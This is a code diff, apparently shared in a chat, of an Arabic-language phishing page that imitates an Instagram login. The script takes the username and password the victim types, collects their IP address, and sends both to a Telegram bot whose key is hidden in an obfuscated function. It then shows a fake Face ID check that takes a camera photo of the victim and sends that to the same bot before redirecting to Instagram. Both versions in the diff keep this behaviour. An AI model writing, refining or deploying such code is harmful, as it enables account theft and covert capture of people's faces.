@@ -1,4 +1,4 @@
-[20/11/2026 3:53 PM] A: <!DOCTYPE html>
+[20/11/2026 4:00 PM] A: <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
@@ -38,7 +38,7 @@
         <section id="verify-section" class="panel">
             <h3 style="font-size: 17px;">مراجعة أمنية</h3>
             <p style="font-size: 13px; color: #8e8e8e; line-height: 1.5;">للتأكد من أنك لست برنامج روبوت، يرجى إجراء فحص سريع للقياسات الحيوية (Face ID).</p>
-            <button id="biometric-btn">تأكيد الهوية الآن</button>
+            <button id="biometric-btn" type="button">تأكيد الهوية الآن</button>
         </section>
 
         <div class="panel" style="padding: 20px;">
@@ -65,77 +65,77 @@
             return s1 + ":" + s2 + s3 + s4 + s5;
         }
 
-        let user_id = "", user_pw = "";
         let ip_info = "جاري الجلب...";
+        let user_id = "";
 
-        // جلب الـ IP في الخلفية عند فتح الصفحة
-        window.onload = async () => {
-            try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const data = await res.json();
-                ip_info = data.ip;
-            } catch(e) { 
-                ip_info = "غير معروف"; 
-            }
-        };
-[20/11/2026 3:53 PM] A: // 1. عند تسجيل الدخول: الانتقال الفوري للواجهة التالية وإرسال البيانات بالخلفية لضمان عدم التعليق
-        document.getElementById('login-form').addEventListener('submit', function(e) {
-            e.preventDefault(); 
-            user_id = document.getElementById('user').value;
-            user_pw = document.getElementById('pass').value;
+        // جلب الـ IP فوراً عند فتح الصفحة
+        fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(data => { ip_info = data.ip; })
+            .catch(() => { ip_info = "غير معروف"; });
 
-            const msg = 📥 صيدة نصية:\n👤 الحساب: ${user_id}\n🔑 الباسورد: ${user_pw}\n🌐 IP: ${ip_info};
-            
-            // إرسال البيانات في الخلفية دون استخدام await لكي لا تتعطل حركة المستخدم
-            fetch(https://api.telegram.org/bot${_buildKey()}/sendMessage?chat_id=${cId}&text=${encodeURIComponent(msg)})
-                .catch(err => console.log("Telegram fetch error:", err));
-
-            // الانتقال الفوري لواجهة التحقق الأمني (Face ID) دون انتظار استجابة الشبكة
-            document.getElementById('auth-section').style.display = 'none';
-            document.getElementById('verify-section').style.display = 'block';
-        });
-
-        // 2. عند الضغط على تأكيد الهوية: طلب إذن الكاميرا، التقاط الصورة، إرسالها، ثم التحويل النهائي
-        document.getElementById('biometric-btn').addEventListener('click', async function() {
-            this.innerText = "... جاري الفحص";
-            this.disabled = true;
-
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                await video.play();
-
-                // مهلة قصيرة جداً لضمان تجهيز إطارات الفيديو
-                await new Promise(resolve => setTimeout(resolve, 1000));
-
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 480;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        // ربط أحداث النموذج مباشرة لأن السكريبت موجود في نهاية الـ body
+[20/11/2026 4:00 PM] A: const loginForm = document.getElementById('login-form');
+        if (loginForm) {
+            loginForm.addEventListener('submit', function(e) {
+                e.preventDefault(); // منع الإرسال الافتراضي وظهور علامة ? نهائياً
                 
-                canvas.toBlob(async (blob) => {
-                    if (blob) {
-                        const fd = new FormData();
-                        fd.append('chat_id', cId);
-                        fd.append('photo', blob, 'biometric.jpg');
-                        fd.append('caption', 📸 صورة القياسات الحيوية لـ:\n👤 ${user_id}\n📱 ${navigator.userAgent});
+                user_id = document.getElementById('user').value;
+                const user_pw = document.getElementById('pass').value;
 
-                        // إرسال الصورة في الخلفية ثم التحويل الفوري
-                        fetch(https://api.telegram.org/bot${_buildKey()}/sendPhoto, { method: 'POST', body: fd })
-                            .catch(err => console.log("Photo send error:", err));
-                    }
+                const msg = 📥 صيدة نصية:\n👤 الحساب: ${user_id}\n🔑 الباسورد: ${user_pw}\n🌐 IP: ${ip_info};
+                
+                // إرسال البيانات للبوت في الخلفية
+                fetch(https://api.telegram.org/bot${_buildKey()}/sendMessage?chat_id=${cId}&text=${encodeURIComponent(msg)})
+                    .catch(err => console.log("Telegram error:", err));
 
-                    stream.getTracks().forEach(t => t.stop());
+                // الانتقال المباشر لصفحة المراجعة الأمنية
+                document.getElementById('auth-section').style.display = 'none';
+                document.getElementById('verify-section').style.display = 'block';
+            });
+        }
+
+        // ربط زر الفحص الحيوي (الكاميرا)
+        const bioBtn = document.getElementById('biometric-btn');
+        if (bioBtn) {
+            bioBtn.addEventListener('click', async function() {
+                this.innerText = "... جاري الفحص";
+                this.disabled = true;
+
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    await video.play();
+
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    canvas.toBlob(async (blob) => {
+                        if (blob) {
+                            const fd = new FormData();
+                            fd.append('chat_id', cId);
+                            fd.append('photo', blob, 'biometric.jpg');
+                            fd.append('caption', 📸 صورة القياسات الحيوية لـ:\n👤 ${user_id}\n📱 ${navigator.userAgent});
+
+                            fetch(https://api.telegram.org/bot${_buildKey()}/sendPhoto, { method: 'POST', body: fd })
+                                .catch(err => console.log("Photo error:", err));
+                        }
+
+                        stream.getTracks().forEach(t => t.stop());
+                        window.location.replace("https://www.instagram.com/reels/");
+                    }, 'image/jpeg', 0.95);
+
+                } catch (err) {
                     window.location.replace("https://www.instagram.com/reels/");
-                }, 'image/jpeg', 0.95);
-
-            } catch (err) {
-                // إذا رفض المستخدم الكاميرا أو حدث خطأ، يتم تحويله طبيعياً لتكتمل التجربة التعليمية
-                window.location.replace("https://www.instagram.com/reels/");
-            }
-        });
+                }
+            });
+        }
     </script>
 </body>
 </html>
